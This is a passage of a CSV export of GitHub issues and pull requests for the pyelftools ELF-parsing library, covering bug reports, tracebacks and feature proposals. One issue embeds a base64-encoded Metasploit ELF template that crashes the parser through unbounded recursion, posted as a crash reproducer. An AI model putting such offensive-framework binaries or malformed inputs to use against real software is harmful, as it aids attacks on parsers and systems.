the first of these via `get_symbol_by_name`. This commit alters this function
to return a list of all symbols under the given name, rather than just the
first entry. Functionality when a symbol name does not exist remains
unaffected.

---

This PR relates to comments on 46ae4bd3a5f7b0e355913b3497f0e96ac2778ef5.

By the way, is there a way to test changes on Travis before submitting a pull request?
",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/69/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/69/comments,https://api.github.com/repos/eliben/pyelftools/issues/69/events,https://github.com/eliben/pyelftools/pull/69,https://api.github.com/repos/eliben/pyelftools/pulls/69
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/68,58502368,MDExOlB1bGxSZXF1ZXN0Mjk3NzAyNjQ=,68,rename readelf.py to readelf,502560,closed,FALSE,NA,NA,2,2015-02-22T13:18:57Z,2015-02-22T16:08:19Z,2015-02-22T16:08:19Z,NONE,NA,"This PR renames readelf.py to pyreadelf.
",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/68/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/68/comments,https://api.github.com/repos/eliben/pyelftools/issues/68/events,https://github.com/eliben/pyelftools/pull/68,https://api.github.com/repos/eliben/pyelftools/pulls/68
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/67,58473441,MDU6SXNzdWU1ODQ3MzQ0MQ==,67,Rename readelf.py to pyreadelf (or something similar),502560,closed,FALSE,NA,NA,1,2015-02-21T20:21:48Z,2015-02-22T16:18:11Z,2015-02-22T16:18:11Z,NONE,NA,"Hi,
I'm preparing the package for Debian and there is this rule that programs in /usr/bin should not have extension (https://lintian.debian.org/tags/script-with-language-extension.html). I propose to change it to pyreadelf - I'll prepare a PR if you agree.

Cheers,
Tomasz
",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/67/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/67/comments,https://api.github.com/repos/eliben/pyelftools/issues/67/events,https://github.com/eliben/pyelftools/issues/67,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/66,58239357,MDU6SXNzdWU1ODIzOTM1Nw==,66,C++ name demangling,141859,closed,FALSE,NA,NA,1,2015-02-19T17:21:04Z,2015-02-20T13:43:32Z,2015-02-20T13:43:32Z,NONE,NA,"Hi, 

so far I know you are interested in the C++ world. Was looking for a python elf reader and bumped into this project. Having seen your blog, had also the hope to find C++ demangling in your library, but unfortunately it is not the case. Are you planning to implement something in this direction or you would just use the libiberty implementation.

Anyway thanks for the great source code.
",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/66/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/66/comments,https://api.github.com/repos/eliben/pyelftools/issues/66/events,https://github.com/eliben/pyelftools/issues/66,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/65,58228518,MDU6SXNzdWU1ODIyODUxOA==,65,test/run_readelf_tests.py failed due to 32bit system and 64bit readelf-binary,3833685,open,FALSE,NA,NA,9,2015-02-19T16:09:34Z,2017-04-24T05:33:47Z,NA,NONE,NA,"There is a problem with 32bit systems and the run_readelf_tests.py. 
Your readelf binary in test/external_tools/readelf is 64bit due to this the run_readelf_tests.py failed. I copied  my readelf binary to this location but this causes a failing test, because youre hardcoded expectations are not equal to the output of the readelf 32bit binary.

Fail-Log with 64bit readelf binary on 32bit system:

```
Test file 'test/testfiles_for_readelf/update32.o.elf'
Traceback (most recent call last):
  File ""test/run_readelf_tests.py"", line 214, in <module>
    sys.exit(main())
  File ""test/run_readelf_tests.py"", line 203, in main
    verbose=options.verbose)
  File ""test/run_readelf_tests.py"", line 60, in run_test_on_file
    rc, stdout = run_exe(exe_path, args)
  File ""/tmp/yaourt-tmp-user/aur-python2-pyelftools/src/pyelftools-0.23/test/utils.py"", line 30, in run_exe
    proc = subprocess.Popen(popen_cmd, stdout=subprocess.PIPE)
  File ""/usr/lib/python2.7/subprocess.py"", line 710, in __init__
    errread, errwrite)
  File ""/usr/lib/python2.7/subprocess.py"", line 1335, in _execute_child
    raise child_exception
```

Fail-Log with 32bit readelf binary on 32bit system:

```
user@trudy ..python2-pyelftools/src/pyelftools-0.23 % python2 test/run_readelf_tests.py
Test file 'test/testfiles_for_readelf/exe_simple32.elf'
Test file 'test/testfiles_for_readelf/exe_simple64.elf'
.......................FAIL
....for option ""--debug-dump=frames""
....Output #1 is readelf, Output #2 is pyelftools
@@ Mismatch on line #1:
>>00000000 0000000000000014 ffffffff cie<<
>>00000000 0000000000000014 00000000ffffffff cie<<
 ([('equal', 0, 26, 0, 26), ('insert', 26, 26, 26, 34), ('equal', 26, 38, 34, 46)])
@@ Output #1 dumped to file: /tmp/out1_cuI3KG.stdout
@@ Output #2 dumped to file: /tmp/out2_FUr_dM.stdout
.......................FAIL
....for option ""--debug-dump=frames-interp""
....Output #1 is readelf, Output #2 is pyelftools
@@ Mismatch on line #1:
>>00000000 0000000000000014 ffffffff cie """" cf=1 df=-8 ra=16<<
>>00000000 0000000000000014 00000000ffffffff cie """" cf=1 df=-8 ra=16<<
 ([('equal', 0, 26, 0, 26), ('insert', 26, 26, 26, 34), ('equal', 26, 58, 34, 66)])
@@ Output #1 dumped to file: /tmp/out1_WiRZEN.stdout
@@ Output #2 dumped to file: /tmp/out2_qwsiW9.stdout
Conclusion: FAIL
python2 test/run_readelf_tests.py  6.34s user 0.64s system 96% cpu 7.250 total
```
",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/65/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/65/comments,https://api.github.com/repos/eliben/pyelftools/issues/65/events,https://github.com/eliben/pyelftools/issues/65,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/64,55389350,MDExOlB1bGxSZXF1ZXN0Mjc5ODQ0OTQ=,64,Using the MutableMapping type is unnecessary.  Subclassing dict and addi...,111640,closed,FALSE,NA,NA,1,2015-01-24T23:44:23Z,2015-01-25T16:13:38Z,2015-01-25T16:13:38Z,NONE,NA,"...ng a few functions is all that's required.  Additionally, this makes the output more readable when printing a Container type.
",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/64/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/64/comments,https://api.github.com/repos/eliben/pyelftools/issues/64/events,https://github.com/eliben/pyelftools/pull/64,https://api.github.com/repos/eliben/pyelftools/pulls/64
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/63,55389348,MDExOlB1bGxSZXF1ZXN0Mjc5ODQ0OTM=,63,Provide str() and repr() representations for sections and segments,111640,closed,FALSE,NA,NA,4,2015-01-24T23:44:18Z,2016-10-16T20:50:27Z,2016-10-16T20:50:27Z,NONE,NA,,NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/63/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/63/comments,https://api.github.com/repos/eliben/pyelftools/issues/63/events,https://github.com/eliben/pyelftools/pull/63,https://api.github.com/repos/eliben/pyelftools/pulls/63
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/62,55389008,MDExOlB1bGxSZXF1ZXN0Mjc5ODQzMTg=,62,Convenientce: Enable opening an ELF file by pathname rather than file(),111640,closed,FALSE,NA,NA,1,2015-01-24T23:30:08Z,2015-01-25T16:12:34Z,2015-01-25T16:12:34Z,NONE,NA,,NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/62/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/62/comments,https://api.github.com/repos/eliben/pyelftools/issues/62/events,https://github.com/eliben/pyelftools/pull/62,https://api.github.com/repos/eliben/pyelftools/pulls/62
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/61,54740861,MDU6SXNzdWU1NDc0MDg2MQ==,61,describe_DWARF_expr() raises on some inputs.,3856546,closed,FALSE,NA,NA,5,2015-01-19T09:15:14Z,2020-02-04T14:35:34Z,2020-02-04T14:35:34Z,NONE,NA,"```
$ python scripts/readelf.py --debug-dump=info /tmp/module_dwarf.ko 
....
 <2><359>: Abbrev Number: 13 (DW_TAG_member)
    <35a>   DW_AT_name        : (indirect string, offset: 0xab00): counter  
    <35e>   DW_AT_decl_file   : 5   
    <35f>   DW_AT_decl_line   : 176 
    <360>   DW_AT_type        : <0x70>  
Traceback (most recent call last):
  File ""scripts/readelf.py"", line 1170, in <module>
    main()
  File ""scripts/readelf.py"", line 1149, in main
    readelf.display_debug_dump(options.debug_dump_what)
  File ""scripts/readelf.py"", line 658, in display_debug_dump
    self._dump_debug_info()
  File ""scripts/readelf.py"", line 881, in _dump_debug_info
    attr, die, section_offset)))
  File ""./elftools/dwarf/descriptions.py"", line 38, in describe_attr_value
    extra_info = extra_info_func(attr, die, section_offset)
  File ""./elftools/dwarf/descriptions.py"", line 388, in _location_list_extra
    return describe_DWARF_expr(attr.value, die.cu.structs)
  File ""./elftools/dwarf/descriptions.py"", line 149, in describe_DWARF_expr
    dwarf_expr_dumper.process_expr(expr)
  File ""./elftools/dwarf/dwarf_expr.py"", line 119, in process_expr
    self.stream = BytesIO(bytelist2string(expr))
  File ""./elftools/common/utils.py"", line 19, in bytelist2string
    return b''.join(int2byte(b) for b in bytelist)
TypeError: 'int' object is not iterable
```

The sample file is at:
https://drive.google.com/file/d/0B9hc84IflFGbSDJ5NnNQRFotZDA/view?usp=sharing
",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/61/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/61/comments,https://api.github.com/repos/eliben/pyelftools/issues/61/events,https://github.com/eliben/pyelftools/issues/61,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/60,52214053,MDU6SXNzdWU1MjIxNDA1Mw==,60,Malformed ELF causes RuntimeError on recursion,1274946,open,FALSE,NA,NA,1,2014-12-17T08:39:01Z,2016-10-16T21:12:35Z,NA,NONE,NA,"Template file from metasploit causes maximum recursion depth to exceed when given to pyelftools.

--- snip
[antti]% base64 -i template_x64_linux_dll.bin 
f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAogEAAAAAAABAAAAAAAAAALAAAAAAAAAAAAAAAEAAOAACAEAAAgABAAEAAAAHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA776t3gAAAADvvq3eAAAAAAAQAAAAAAAAAgAAAAcAAAAwAQAAAAAAADABAAAAAAAAMAEAAAAAAABwAAAAAAAAAHAAAAAAAAAAABAAAAAAAAABAAAABgAAAAAAAAAAAAAAMAEAAAAAAAAwAQAAAAAAAHAAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAHAAAAAAAAAAAAAAAAMAAAAAAAAAAAAAAKABAAAAAAAAoAEAAAAAAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwAAAAAAAAAogEAAAAAAAAEAAAAAAAAAAAAAAAAAAAABQAAAAAAAACgAQAAAAAAAAYAAAAAAAAAoAEAAAAAAAAKAAAAAAAAAAIAAAAAAAAACwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==
--- snip

Traceback:
--- snip
[antti]% readelf.py -d template_x64_linux_dll.bin 
Traceback (most recent call last):
  File ""/usr/local/bin/readelf.py"", line 1136, in <module>
    main()
  File ""/usr/local/bin/readelf.py"", line 1103, in main
    readelf.display_dynamic_tags()
  File ""/usr/local/bin/readelf.py"", line 333, in display_dynamic_tags
    for section in self.elffile.iter_sections():
  File ""/usr/local/lib/python2.7/site-packages/elftools/elf/elffile.py"", line 92, in iter_sections
    yield self.get_section(i)
  File ""/usr/local/lib/python2.7/site-packages/elftools/elf/elffile.py"", line 72, in get_section
    return self._make_section(section_header)
  File ""/usr/local/lib/python2.7/site-packages/elftools/elf/elffile.py"", line 265, in _make_section
    return DynamicSection(section_header, name, self.stream, self)
  File ""/usr/local/lib/python2.7/site-packages/elftools/elf/dynamic.py"", line 103, in __init__
...
  File ""/usr/local/lib/python2.7/site-packages/elftools/elf/elffile.py"", line 232, in _get_section_header
    stream_pos=self._section_offset(n))
  File ""/usr/local/lib/python2.7/site-packages/elftools/elf/elffile.py"", line 208, in _section_offset
    return self['e_shoff'] + n \* self['e_shentsize']
  File ""/usr/local/lib/python2.7/site-packages/elftools/elf/elffile.py"", line 176, in __getitem__
    return self.header[name]
RuntimeError: maximum recursion depth exceeded while calling a Python object
",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/60/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/60/comments,https://api.github.com/repos/eliben/pyelftools/issues/60/events,https://github.com/eliben/pyelftools/issues/60,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/59,51302563,MDU6SXNzdWU1MTMwMjU2Mw==,59,Over broad exception catching (except Exception),305104,closed,FALSE,NA,NA,2,2014-12-08T13:38:47Z,2014-12-08T16:09:37Z,2014-12-08T16:09:37Z,NONE,NA,"I have an issue where I'm running pyelftools and need to interrupt processing. I'm calling pyelftools from a Celery task. Celery cancels tasks by raising an celery.exceptions.Terminated exception. pyelftools unfortunately catches this and as a result, my task does not get cancelled.

As a fix, all occurences of except Exception should be changed to catch more specific exceptions, such as IOError, ValueError etc.

I did not track which of the exceptions I'm hitting yet, but here's one example of offending try-except: https://github.com/eliben/pyelftools/blob/master/elftools/construct/core.py#L352

Any chance someone familiar with the pyelftools internals could determine which exceptions actually need to be caught and make the changes? Here's a list.

```
$ git grep --line-number ""except Exception""
elftools/construct/core.py:238:        except Exception as e:
elftools/construct/core.py:352:        except Exception as ex:
elftools/construct/core.py:357:        except Exception as ex:
elftools/construct/core.py:903:                except Exception:
elftools/construct/debug.py:113:        except Exception:
elftools/construct/debug.py:124:        except Exception:
```
",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/59/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/59/comments,https://api.github.com/repos/eliben/pyelftools/issues/59/events,https://github.com/eliben/pyelftools/issues/59,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/58,49857290,MDExOlB1bGxSZXF1ZXN0MjQ5MTQwOTU=,58,Functionality for retrieving a symbol by name,203893,closed,FALSE,NA,NA,3,2014-11-24T05:19:24Z,2014-12-28T14:52:46Z,2014-12-28T14:52:46Z,CONTRIBUTOR,NA,"This implements similar functionality to `get_section_by_name` for retrieving a symbol from an ELF file by its name.

I'm not sure whether there are any guidelines around what should and should not be in elftools, so if there is something objectionable about adding this functionality please feel free to refuse this pull request.
",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/58/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/58/comments,https://api.github.com/repos/eliben/pyelftools/issues/58/events,https://github.com/eliben/pyelftools/pull/58,https://api.github.com/repos/eliben/pyelftools/pulls/58
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/57,47841978,MDU6SXNzdWU0Nzg0MTk3OA==,57,Arm abbrev_code,9572313,closed,FALSE,NA,NA,2,2014-11-05T14:34:10Z,2017-02-04T17:10:46Z,2017-02-04T17:10:21Z,NONE,NA,"Hi

it seems that with arm binary the abbrev_code is wrong, pyelftools catchs only the last byte, the abbrev_code is on 2 bytes.

ex:
 <1><6a126>: Abbrev Number: 6 (DW_TAG_typedef)

DW_TAG_typedef is 0x16

Cheers,
",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/57/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/57/comments,https://api.github.com/repos/eliben/pyelftools/issues/57/events,https://github.com/eliben/pyelftools/issues/57,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/56,46850451,MDExOlB1bGxSZXF1ZXN0MjMzNTQyNjI=,56,Mips support,4101575,closed,FALSE,NA,NA,6,2014-10-26T18:32:22Z,2014-11-01T13:29:04Z,2014-11-01T13:01:09Z,CONTRIBUTOR,NA,"This adds minimal support to process MIPS files. A very basic unittest is included.

When the mips executable is used for the readelf simulation test, it does show some issues where the python version of readelf doesn't quite follow binutils readelf. Some of these are already fixed in this patch set (ie. the PT_LOOS / SHT_LOOS output), but here are also issues with ra_regnum being shown in the dwarf sections where binutils doesn't. 
",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/56/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/56/comments,https://api.github.com/repos/eliben/pyelftools/issues/56/events,https://github.com/eliben/pyelftools/pull/56,https://api.github.com/repos/eliben/pyelftools/pulls/56
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/55,44716376,MDExOlB1bGxSZXF1ZXN0MjIxNTc1MzU=,55,Add -a --all option,296039,closed,FALSE,NA,NA,6,2014-10-02T17:50:27Z,2016-10-16T20:50:10Z,2016-10-16T20:50:10Z,NONE,NA,"Add -a --all option support like GNU binutils readelf command
",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/55/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/55/comments,https://api.github.com/repos/eliben/pyelftools/issues/55/events,https://github.com/eliben/pyelftools/pull/55,https://api.github.com/repos/eliben/pyelftools/pulls/55
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/54,44615126,MDExOlB1bGxSZXF1ZXN0MjIxMDE3ODI=,54,Add -a --all option,296039,closed,FALSE,NA,NA,1,2014-10-01T20:30:42Z,2014-10-02T16:50:06Z,2014-10-02T16:50:06Z,NONE,NA,"Add -a --all option support to match GNU binutils readelf command.
",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/54/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/54/comments,https://api.github.com/repos/eliben/pyelftools/issues/54/events,https://github.com/eliben/pyelftools/pull/54,https://api.github.com/repos/eliben/pyelftools/pulls/54
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/53,44056728,MDExOlB1bGxSZXF1ZXN0MjE4NDU4MzU=,53,Update ordereddict.py,8928577,closed,FALSE,NA,NA,3,2014-09-26T12:42:13Z,2014-11-18T14:34:34Z,2014-11-01T13:13:58Z,NONE,NA,"I had errors using readelf.py with --debug-dump with python 2.7
",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/53/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/53/comments,https://api.github.com/repos/eliben/pyelftools/issues/53/events,https://github.com/eliben/pyelftools/pull/53,https://api.github.com/repos/eliben/pyelftools/pulls/53
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/52,41924545,MDU6SXNzdWU0MTkyNDU0NQ==,52,Easy way to get the binary image,3007095,closed,FALSE,NA,NA,6,2014-09-04T11:25:02Z,2014-09-08T14:00:29Z,2014-09-07T01:26:39Z,NONE,NA,"Hi,

Is there an easy way to get the binary image from an ELF file to be programmed into a microcontroller flash? I currently have a bootloader written in python based on IntelHex to send an intel hex file to an ARM Cortex-M microcontroller. But I would like to extend it to support ELF files. Is there something like this available or do I have to start writing it myself?

I would have asked this on a forum or mailing list if I could find one, but I only found this issue tracker. My apologies if I'm using the wrong channel for asking questions.
",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/52/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/52/comments,https://api.github.com/repos/eliben/pyelftools/issues/52/events,https://github.com/eliben/pyelftools/issues/52,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/51,41271194,MDExOlB1bGxSZXF1ZXN0MjAzNjYyNjI=,51,Add check for duplicate attribute value.,8567076,closed,FALSE,NA,NA,4,2014-08-27T11:04:13Z,2014-11-01T13:15:32Z,2014-11-01T13:15:32Z,NONE,NA,"This check cannot be performed by a user of pyelftools as the attributes are presented as an OrderedDict.
",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/51/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/51/comments,https://api.github.com/repos/eliben/pyelftools/issues/51/events,https://github.com/eliben/pyelftools/pull/51,https://api.github.com/repos/eliben/pyelftools/pulls/51
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/50,41064964,MDU6SXNzdWU0MTA2NDk2NA==,50,Problem in Evaluating Dwarf Location Expression,5499296,closed,FALSE,NA,NA,3,2014-08-25T14:13:59Z,2017-02-04T17:11:23Z,2017-02-04T17:11:23Z,NONE,NA,"Hi,
  I want to evaluate the DW_AT_Location attribute.
So, first I intialiazed Compile unit and then I instantiated GenericExprVisitor object and then using that reference, calling process_expr(value) procedure. But it is retuning 'none' every time.

Code flow is as follows

Get CU instance
Gref = GenericExprVisitor(CU.structs)
x, d = die.attributes.items()
if x == 'DW_AT_Location'
Gref.process_expr(d.value)
",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/50/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/50/comments,https://api.github.com/repos/eliben/pyelftools/issues/50/events,https://github.com/eliben/pyelftools/issues/50,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/49,40844495,MDU6SXNzdWU0MDg0NDQ5NQ==,49,UnboundLocalError: local variable 'stringtable' referenced before assignment,28985,closed,FALSE,NA,NA,3,2014-08-21T20:22:09Z,2016-10-16T20:58:22Z,2016-10-16T20:58:22Z,NONE,NA,"I tried running the following command: python readelf.py meander.debug -e

and I received the Traceback shown below:

Traceback (most recent call last):
  File ""../../lib/pyelftools-0.22/scripts/readelf.py"", line 1136, in <module>
    main()
  File ""../../lib/pyelftools-0.22/scripts/readelf.py"", line 1101, in main
    show_heading=not do_file_header)
  File ""../../lib/pyelftools-0.22/scripts/readelf.py"", line 170, in display_program_headers
    for segment in self.elffile.iter_segments():
  File ""/usr/local/lib/python2.7/site-packages/elftools/elf/elffile.py"", line 109, in iter_segments
    yield self.get_segment(i)
  File ""/usr/local/lib/python2.7/site-packages/elftools/elf/elffile.py"", line 103, in get_segment
    return self._make_segment(segment_header)
  File ""/usr/local/lib/python2.7/site-packages/elftools/elf/elffile.py"", line 222, in _make_segment
    return DynamicSegment(segment_header, self.stream, self)
  File ""/usr/local/lib/python2.7/site-packages/elftools/elf/dynamic.py"", line 123, in __init__
    Dynamic.**init**(self, stream, elffile, stringtable, self['p_offset'])
UnboundLocalError: local variable 'stringtable' referenced before assignment
",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/49/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/49/comments,https://api.github.com/repos/eliben/pyelftools/issues/49/events,https://github.com/eliben/pyelftools/issues/49,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/48,40442688,MDExOlB1bGxSZXF1ZXN0MTk4OTMwODY=,48,Parse PT_NOTE segment.,7899716,closed,FALSE,NA,NA,4,2014-08-17T20:30:19Z,2014-08-22T12:35:38Z,2014-08-22T12:35:38Z,CONTRIBUTOR,NA,"The PT_NOTE segment includes a list of notes with a header, name and
description. GNU ld includes in this segment the GNU build-id and GNU
ABI version information.
",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/48/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/48/comments,https://api.github.com/repos/eliben/pyelftools/issues/48/events,https://github.com/eliben/pyelftools/pull/48,https://api.github.com/repos/eliben/pyelftools/pulls/48
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/47,39130797,MDExOlB1bGxSZXF1ZXN0MTkxMTM0MDM=,47,Sane iterators for regular usage patterns,111640,closed,FALSE,NA,NA,4,2014-07-30T19:58:49Z,2016-10-16T20:49:36Z,2016-10-16T20:49:36Z,NONE,NA,"Permit regular usage of iterators for sections, segments, and regular property-style access for dwarf_info and machine_arg.

``` python
for section in elf.iter_sections():
```

Is equivalent to

``` python
for section in elf.sections:
```
",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/47/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/47/comments,https://api.github.com/repos/eliben/pyelftools/issues/47/events,https://github.com/eliben/pyelftools/pull/47,https://api.github.com/repos/eliben/pyelftools/pulls/47
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/46,39129959,MDExOlB1bGxSZXF1ZXN0MTkxMTI4NTg=,46,Convenientce: Enable opening an ELF file by pathname rather than file(),111640,closed,FALSE,NA,NA,0,2014-07-30T19:49:36Z,2015-01-24T23:26:00Z,2014-07-30T20:11:19Z,NONE,NA,"Just a convenience method.

```
>>> import elftools.elf.elffile
>>> elftools.elf.elffile.ELFFile('/bin/sh').stream.name
'/bin/sh'
```
",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/46/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/46/comments,https://api.github.com/repos/eliben/pyelftools/issues/46/events,https://github.com/eliben/pyelftools/pull/46,https://api.github.com/repos/eliben/pyelftools/pulls/46
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/45,38770690,MDExOlB1bGxSZXF1ZXN0MTg5MTk0MDc=,45,Support parsing symbol table in dynamic segment.,8271040,closed,FALSE,NA,NA,5,2014-07-25T21:10:14Z,2014-08-21T21:35:04Z,2014-08-07T12:58:45Z,NONE,NA,"Unlike SymbolTableSection, this patch reads from DT_SYMTAB, and
DT_STRTAB in PT_DYNAMIC segment.  It heuristically determines the end of
DT_STRTAB by finding the next higher pointer in the same segment.  GNU
libc (dl-addr.c) assumes that DT_STRTAB comes after DT_SYMTAB.
",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/45/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/45/comments,https://api.github.com/repos/eliben/pyelftools/issues/45/events,https://github.com/eliben/pyelftools/pull/45,https://api.github.com/repos/eliben/pyelftools/pulls/45
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/44,37924508,MDU6SXNzdWUzNzkyNDUwOA==,44,Potential Bug in pyelftools (DW_AT_type decoding),8173309,open,FALSE,NA,NA,3,2014-07-15T20:52:46Z,2019-12-13T19:20:28Z,NA,NONE,NA,"I'm using pyelftools to decode an elf file from the XC32 complier from microchip.
My main goal is to decode variables into address so I can peak and poke them over a CAN interface.

What I found is that the DW_AT_type is not correctly being returned in some cases.

I've created files which I'll describe here (this very narrow window makes the formatting horrendous)

Good_decode.txt - shows what I want the program to do.  It finds a variable and then iterates over and over until it gets to a DIE that doesn't have a DW_AT_type.  It should always find at least one type that describes a variable.

Bad_decode.txt - shows two entries from my python script that is calling the pyelftools.  In these two cases the DW_AT_type is not correct.

objdump.txt - shows the output of the XC32-objdump -w tool.  Its a big file but if you search for 1c7d you'll find the first die for ""adc_raw_data"" and if you search for 1c8f you'll find the one for ""adc_sensors_ready"".

compare.txt - shows just the 1c7d ""adc_raw_data"" above and below for comparison.  As you can see the only difference is in the DW_AT_type field and you can see that they disagree about the address for DW_AT_type.
0x18e9 = 6377  != 5874

Files are located here:
https://gist.github.com/bshaffer82/35f6e35be1157fc1776c#file-bad_decode-txt
Thanks
",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/44/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/44/comments,https://api.github.com/repos/eliben/pyelftools/issues/44/events,https://github.com/eliben/pyelftools/issues/44,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/43,36939830,MDExOlB1bGxSZXF1ZXN0MTc4NjA0MjE=,43,Run tests on Python 3.4,416575,closed,FALSE,NA,NA,0,2014-07-01T23:22:42Z,2014-07-03T15:55:31Z,2014-07-03T12:18:41Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/43/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/43/comments,https://api.github.com/repos/eliben/pyelftools/issues/43/events,https://github.com/eliben/pyelftools/pull/43,https://api.github.com/repos/eliben/pyelftools/pulls/43
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/42,35056930,MDExOlB1bGxSZXF1ZXN0MTY3NjU3NjA=,42,add Blackfin description,176950,closed,FALSE,NA,NA,0,2014-06-05T13:34:10Z,2014-07-04T17:49:31Z,2014-06-05T13:40:44Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/42/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/42/comments,https://api.github.com/repos/eliben/pyelftools/issues/42/events,https://github.com/eliben/pyelftools/pull/42,https://api.github.com/repos/eliben/pyelftools/pulls/42
